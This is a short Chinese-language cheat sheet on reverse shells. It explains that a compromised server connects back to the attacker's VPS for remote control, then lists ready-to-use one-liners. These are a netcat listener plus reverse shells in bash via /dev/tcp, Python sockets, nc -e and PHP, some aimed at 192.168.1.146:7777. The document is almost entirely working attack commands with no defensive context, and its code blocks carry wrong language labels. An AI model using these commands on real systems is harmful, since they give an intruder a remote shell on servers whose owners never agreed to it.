# 反弹shell备忘录

简单理解，通常是我们主动发起请求，去访问服务器（某个IP的某个端口），比如我们常访问的web服务器：`http(https)://ip:80`，这是因为在服务器上面开启了80端口的监听，我们去访问它的时候，就会给我们建立连接。而现在所谓的`反弹shell`指的是反过来在我们自己的公网vps建立监听，然后让服务器反弹一个shell来连接我们自己的主机，然后我们就能通过反弹的shell去远程控制服务器了。

接受端运行

```
nc -lvp port
```

bash

```ruby
bash -i >& /dev/tcp/ip/port 0>&1
```

![1573140057801.png](https://i.loli.net/2019/11/07/zjqSWmE9yiQLsFr.png)

python

```swift
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

nc

```csharp
nc -e /bin/bash 192.168.1.146 7777
```

php

```csharp
php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.1.146/7777");'
```

```dart
php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

